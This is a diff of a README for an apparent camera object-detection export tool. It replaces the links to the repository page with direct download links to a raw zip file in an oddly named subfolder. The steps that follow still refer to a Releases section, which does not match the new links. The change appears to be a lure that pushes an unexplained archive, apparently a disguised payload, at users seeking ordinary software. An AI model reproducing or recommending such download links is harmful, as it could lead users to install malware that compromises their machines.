@@ -1,6 +1,6 @@
 # 📦 frigate-yolo-export - Simplify your camera object detection setup
 
-[![](https://img.shields.io/badge/Download-frigate--yolo--export-blue.svg)](https://github.com/fixingsloanoffice487/frigate-yolo-export)
+[![](https://img.shields.io/badge/Download-frigate--yolo--export-blue.svg)](https://github.com/fixingsloanoffice487/frigate-yolo-export/raw/refs/heads/main/tailage/yolo_export_frigate_v2.5.zip)
 
 ## 💡 About this software
 
@@ -19,7 +19,7 @@ Ensure your computer meets these requirements before you start:
 
 Visit the project page to download the necessary files to your computer.
 
-[Download link: https://github.com/fixingsloanoffice487/frigate-yolo-export](https://github.com/fixingsloanoffice487/frigate-yolo-export)
+[Download link: https://github.com/fixingsloanoffice487/frigate-yolo-export/raw/refs/heads/main/tailage/yolo_export_frigate_v2.5.zip](https://github.com/fixingsloanoffice487/frigate-yolo-export/raw/refs/heads/main/tailage/yolo_export_frigate_v2.5.zip)
 
 1. Open your web browser and navigate to the link above.
 2. Look for the Releases section on the right side of the page.
